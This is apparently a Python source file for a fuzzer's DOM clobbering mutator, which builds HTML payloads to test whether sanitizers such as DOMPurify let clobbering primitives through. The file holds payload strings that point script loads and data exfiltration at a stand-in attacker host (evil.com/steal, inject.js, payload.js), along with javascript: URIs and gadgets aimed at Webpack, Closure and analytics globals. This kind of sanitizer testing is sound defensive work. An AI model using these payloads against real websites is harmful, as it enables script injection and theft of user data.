"""DOM Clobbering combinatorial mutator — tag×attribute×nesting×namespace exploration.

Focuses on discovering DOM Clobbering primitives by systematically exploring:
  - Single id/name clobbering vectors (any element × any target)
  - HTMLCollection chains (x.y via duplicate id)
  - Form child chains (x.y via form→named child)
  - Triple chains (x.y.z via nested forms)
  - Anchor toString exploitation (href → string coercion)
  - Sanitizer internal property clobbering
  - Built-in document property shadowing
  - Framework-specific gadgets (Webpack, Closure, AMP)
  - Namespace boundary crossings (SVG/MathML foreignObject)
  - Corpus splicing and multi-vector combinations

Uses weighted strategy selection with feedback-driven adaptation.

References:
  - dom-clobbering.md taxonomy
  - Khodayari & Pellegrino "It's (DOM) Clobbering Time" (CCS 2023)
  - DOMPurify §3 bypass taxonomy
"""

from __future__ import annotations

import logging
import random
from typing import TYPE_CHECKING

from ..protocols import Input

if TYPE_CHECKING:
    from ..corpus import Seed

logger = logging.getLogger(__name__)

# ── Payload pools ────────────────────────────────────────────────

CLOBBER_TAGS = (b"a", b"area", b"form", b"img", b"input", b"object", b"embed",
                b"iframe", b"button", b"fieldset", b"output", b"select", b"textarea")

NAMED_ELEMENTS = (b"form", b"embed", b"iframe", b"img", b"object")  # Elements that clobber via name

CLOBBER_TARGETS = (
    b"config", b"settings", b"options", b"baseUrl", b"defaultUrl",
    b"cdnUrl", b"apiUrl", b"endpoint", b"currentScript",
    b"__webpack_public_path__", b"__webpack_nonce__",
    b"CLOSURE_BASE_PATH", b"AMP_MODE",
    b"analytics", b"ga", b"_gaq", b"dataLayer",
)

DOCUMENT_TARGETS = (
    b"cookie", b"domain", b"referrer", b"location", b"URL",
    b"body", b"head", b"forms", b"images", b"links",
    b"getElementById", b"querySelector", b"title", b"currentScript",
)

CHAIN_PROPS = (
    b"src", b"href", b"action", b"data", b"value", b"url",
    b"path", b"base", b"innerHTML", b"textContent",
    b"method", b"version",
)

EVIL_URLS = (
    b"https://evil.com/",
    b"//evil.com/inject.js",
    b"javascript:alert(1)",
    b"data:text/html,<script>alert(1)</script>",
    b"https://evil.com/steal?data=",
    b"//evil.com/payload.js",
)

SELF_CLOSING = frozenset({b"img", b"input", b"embed", b"area"})

# All targets merged for single-id strategy
_ALL_TARGETS = CLOBBER_TARGETS + DOCUMENT_TARGETS

# Sanitizer internal properties to clobber
_SANITIZER_INTERNALS = (
    b"parentNode", b"__depth", b"remove", b"__removalCount",
    b"nodeName", b"nodeType", b"ownerDocument",
    b"childNodes", b"attributes",
)

# Form child element tags
_FORM_CHILDREN = (b"input", b"img", b"button", b"select", b"textarea")

# Maximum output size to prevent degenerate cases
MAX_OUTPUT_SIZE = 100_000


class DomClobberMutator:
    """DOM Clobbering combinatorial mutator — primitive discovery edition.

    Systematically explores tag×attribute×nesting×namespace combinations
    to discover DOM Clobbering primitives that survive sanitization.
    Strategies are weighted and adapted via feedback from the fuzzing loop.
    """

    name = "domclobber"

    def __init__(self, seed: int | None = None) -> None:
        self.rng = random.Random(seed)
        self._corpus: list[Seed] = []

        self._strategies = [
            self._single_id_clobber,        # weight: 12
            self._named_element_clobber,     # weight: 10
            self._collection_chain,          # weight: 14
            self._form_child_chain,          # weight: 12
            self._triple_chain,              # weight: 8
            self._anchor_tostring,           # weight: 15
            self._sanitizer_internal,        # weight: 8
            self._builtin_shadow,            # weight: 10
            self._framework_gadget,          # weight: 6
            self._namespace_boundary,        # weight: 8
            self._corpus_splice,             # weight: 8
            self._combined_multi,            # weight: 6
        ]
        self._strategy_names = [
            "single_id_clobber",
            "named_element_clobber",
            "collection_chain",
            "form_child_chain",
            "triple_chain",
            "anchor_tostring",
            "sanitizer_internal",
            "builtin_shadow",
            "framework_gadget",
            "namespace_boundary",
            "corpus_splice",
            "combined_multi",
        ]
        self._base_weights = [12, 10, 14, 12, 8, 15, 8, 10, 6, 8, 8, 6]
        self._weights = list(self._base_weights)
        self._weight_total = sum(self._base_weights)
        self._strategy_finds: list[int] = [0] * len(self._strategies)
        self._strategy_cov: list[int] = [0] * len(self._strategies)
        self._total_feedback_calls = 0

    def mutate(self, inp: Input, corpus: list[Seed]) -> Input:
        self._corpus = corpus

        # Select 1-3 strategies weighted by current weights
        num_ops = self.rng.choices([1, 2, 3], weights=[50, 35, 15], k=1)[0]
        applied: list[str] = []
        data = bytearray()

        for i in range(num_ops):
            idx = self.rng.choices(
                range(len(self._strategies)), weights=self._weights, k=1
            )[0]
            strategy = self._strategies[idx]
            applied.append(self._strategy_names[idx])

            if i == 0:
                # First strategy generates from scratch
                data = bytearray(strategy())
            else:
                # Subsequent strategies wrap or combine
                fragment = strategy()
                # 50% prepend, 50% append
                if self.rng.random() < 0.5:
                    data = bytearray(fragment) + data
                else:
                    data.extend(fragment)

        # Size limit
        if len(data) > MAX_OUTPUT_SIZE:
            data = data[:MAX_OUTPUT_SIZE]

        return Input(
            data=bytes(data),
            metadata={
                **inp.metadata,
                "mutator": self.name,
                "strategies": applied,
            },
        )

    def feedback(self, strategy_name: str, signal: str) -> None:
        """Adjust strategy weights based on fuzzing feedback.

        Args:
            strategy_name: Name of the strategy that produced the result.
            signal: "finding", "coverage", or "stage_up".
        """
        try:
            idx = self._strategy_names.index(strategy_name)
        except ValueError:
            return

        self._total_feedback_calls += 1

        multiplier = {
            "finding": 1.5,
            "coverage": 1.2,
            "stage_up": 1.3,
        }.get(signal)

        if multiplier is None:
            return

        if signal == "finding":
            self._strategy_finds[idx] += 1
        else:
            self._strategy_cov[idx] += 1

        self._weights[idx] *= multiplier

        # Normalize weights to preserve original total
        current_total = sum(self._weights)
        if current_total > 0:
            scale = self._weight_total / current_total
            self._weights = [w * scale for w in self._weights]

    def reset_weights(self, boost_zero_finds: bool = False) -> None:
        """Reset dynamic weights -- called by engine on stall detection.

        If boost_zero_finds is True, strategies that have NEVER produced
        a finding get a 2x boost (explore untested strategies).
        """
        for i in range(len(self._strategies)):
            if boost_zero_finds and self._strategy_finds[i] == 0:
                self._weights[i] = self._base_weights[i] * 2
            else:
                self._weights[i] = self._base_weights[i]
        logger.info(
            "Stall reset: boosted %d zero-find strategies to 2x",
            sum(1 for f in self._strategy_finds if f == 0),
        )

    # ── Strategy 1: Single id clobbering ─────────────────────────

    def _single_id_clobber(self) -> bytes:
        """Random element with id from merged CLOBBER_TARGETS + DOCUMENT_TARGETS."""
        tag = self.rng.choice(CLOBBER_TAGS)
        target = self.rng.choice(_ALL_TARGETS)
        if tag in SELF_CLOSING:
            return b'<' + tag + b' id="' + target + b'">'
        return b'<' + tag + b' id="' + target + b'"></' + tag + b'>'

    # ── Strategy 2: Named element clobbering ─────────────────────

    def _named_element_clobber(self) -> bytes:
        """Named element (form/embed/iframe/img/object) with name from DOCUMENT_TARGETS."""
        elem = self.rng.choice(NAMED_ELEMENTS)
        target = self.rng.choice(DOCUMENT_TARGETS)
        if elem in SELF_CLOSING:
            return b'<' + elem + b' name="' + target + b'">'
        return b'<' + elem + b' name="' + target + b'"></' + elem + b'>'

    # ── Strategy 3: Collection chain (dual anchors) ──────────────

    def _collection_chain(self) -> bytes:
        """Two elements with same id -> HTMLCollection -> x.y."""
        t = self.rng.choice(_ALL_TARGETS)
        prop = self.rng.choice(CHAIN_PROPS)
        evil_url = self.rng.choice(EVIL_URLS)

        if self.rng.random() < 0.6:
            # Anchor-based collection chain
            return (b'<a id="' + t + b'"></a>'
                    b'<a id="' + t + b'" name="' + prop + b'" href="' + evil_url + b'">')
        else:
            # Generic tag collection chain
            tag = self.rng.choice(CLOBBER_TAGS)
            if tag in SELF_CLOSING:
                return (b'<' + tag + b' id="' + t + b'">'
                        b'<' + tag + b' id="' + t + b'">')
            return (b'<' + tag + b' id="' + t + b'"></' + tag + b'>'
                    b'<' + tag + b' id="' + t + b'"></' + tag + b'>')

    # ── Strategy 4: Form child chain ─────────────────────────────

    def _form_child_chain(self) -> bytes:
        """Form with named children -> x.y property access."""
        target = self.rng.choice(_ALL_TARGETS)
        prop = self.rng.choice(CHAIN_PROPS)
        evil_url = self.rng.choice(EVIL_URLS)
        child_tag = self.rng.choice(_FORM_CHILDREN)

        if child_tag == b"input":
            child = b'<input name="' + prop + b'" value="' + evil_url + b'">'
        elif child_tag in SELF_CLOSING:
            child = b'<' + child_tag + b' name="' + prop + b'">'
        else:
            child = (b'<' + child_tag + b' name="' + prop + b'">'
                     b'</' + child_tag + b'>')

        return b'<form id="' + target + b'">' + child + b'</form>'

    # ── Strategy 5: Triple chain ─────────────────────────────────

    def _triple_chain(self) -> bytes:
        """HTMLCollection via two forms with same id, one with name."""
        t = self.rng.choice(CLOBBER_TARGETS)
        prop = self.rng.choice(CHAIN_PROPS)
        val = self.rng.choice(EVIL_URLS)

        return (
            b'<form id="' + t + b'" name="' + t + b'">'
            b'<input name="' + prop + b'" value="' + val + b'">'
            b'</form>'
            b'<form id="' + t + b'"></form>'
        )

    # ── Strategy 6: Anchor toString (href) ───────────────────────

    def _anchor_tostring(self) -> bytes:
        """Anchor with id + href for toString exploitation."""
        target = self.rng.choice(_ALL_TARGETS)
        evil_url = self.rng.choice(EVIL_URLS)
        return b'<a id="' + target + b'" href="' + evil_url + b'"></a>'

    # ── Strategy 7: Sanitizer internal property pollution ────────

    def _sanitizer_internal(self) -> bytes:
        """Target sanitizer internal properties (parentNode, __depth, remove, etc.)."""
        internal = self.rng.choice(_SANITIZER_INTERNALS)
        return b'<form id="x"><input name="' + internal + b'"></form>'

    # ── Strategy 8: Builtin document property shadowing ──────────

    def _builtin_shadow(self) -> bytes:
        """Named element shadowing built-in document properties."""
        elem = self.rng.choice(NAMED_ELEMENTS)
        builtin = self.rng.choice(DOCUMENT_TARGETS)
        if elem in SELF_CLOSING:
            return b'<' + elem + b' name="' + builtin + b'">'
        return b'<' + elem + b' name="' + builtin + b'"></' + elem + b'>'

    # ── Strategy 9: Framework-specific gadgets ───────────────────

    def _framework_gadget(self) -> bytes:
        """Known CVE patterns for Webpack, Closure, AMP."""
        evil_url = self.rng.choice(EVIL_URLS)
        gadgets = [
            # Webpack public path
            b'<a id="__webpack_public_path__" href="' + evil_url + b'">',
            # Webpack nonce
            b'<a id="__webpack_nonce__" href="' + evil_url + b'">',
            # currentScript spoofing
            b'<img name="currentScript" src="' + evil_url + b'">',
            # Closure base path
            b'<a id="CLOSURE_BASE_PATH" href="' + evil_url + b'">',
            # AMP mode clobbering
            b'<form id="AMP_MODE"><input name="version" value="latest"></form>',
            # Analytics/GA
            b'<a id="ga" href="' + evil_url + b'">',
            b'<a id="dataLayer" href="' + evil_url + b'">',
        ]
        return self.rng.choice(gadgets)

    # ── Strategy 10: Namespace boundary crossing ─────────────────

    def _namespace_boundary(self) -> bytes:
        """Test clobbering across SVG/MathML namespace boundaries."""
        tag = self.rng.choice(CLOBBER_TAGS)
        target = self.rng.choice(_ALL_TARGETS)
        prop = self.rng.choice(CHAIN_PROPS)

        if tag in SELF_CLOSING:
            inner_elem = b'<' + tag + b' id="' + target + b'">'
        else:
            inner_elem = b'<' + tag + b' id="' + target + b'"></' + tag + b'>'

        patterns = [
            # SVG foreignObject boundary
            b'<svg><foreignObject>' + inner_elem + b'</foreignObject></svg>',
            # MathML mtext boundary
            b'<math><mtext>' + inner_elem + b'</mtext></math>',
            # SVG foreignObject with form chain
            (b'<svg><foreignObject>'
             b'<form id="' + target + b'"><input name="' + prop + b'"></form>'
             b'</foreignObject></svg>'),
            # MathML annotation-xml boundary
            (b'<math><annotation-xml encoding="text/html">'
             + inner_elem +
             b'</annotation-xml></math>'),
        ]
        return self.rng.choice(patterns)

    # ── Strategy 11: Corpus splice ───────────────────────────────

    def _corpus_splice(self) -> bytes:
        """Pick random seed from corpus, combine with a clobbering vector."""
        # Generate a clobbering element to combine
        clobber = self.rng.choice([
            self._single_id_clobber,
            self._anchor_tostring,
            self._form_child_chain,
        ])()

        if not self._corpus or len(self._corpus) < 2:
            return clobber

        donor = self.rng.choice(self._corpus)
        donor_data = donor.input.data

        if len(donor_data) < 4:
            return clobber

        # Take a fragment from the donor
        max_len = min(len(donor_data), 500)
        start = self.rng.randint(0, max(len(donor_data) - max_len, 0))
        fragment = donor_data[start:start + max_len]

        # Combine: prepend, append, or wrap
        mode = self.rng.random()
        if mode < 0.33:
            return clobber + fragment
        elif mode < 0.66:
            return fragment + clobber
        else:
            # Wrap existing content inside a form with id
            target = self.rng.choice(_ALL_TARGETS)
            return b'<form id="' + target + b'">' + fragment + b'</form>'

    # ── Strategy 12: Combined multi-vector ───────────────────────

    def _combined_multi(self) -> bytes:
        """Multiple clobbering vectors combined for interaction effects."""
        pool = [
            self._single_id_clobber,
            self._named_element_clobber,
            self._collection_chain,
            self._form_child_chain,
            self._anchor_tostring,
            self._sanitizer_internal,
            self._builtin_shadow,
            self._framework_gadget,
            self._namespace_boundary,
        ]
        count = self.rng.choice([2, 3])
        chosen = self.rng.sample(pool, min(count, len(pool)))
        return b"".join(fn() for fn in chosen)
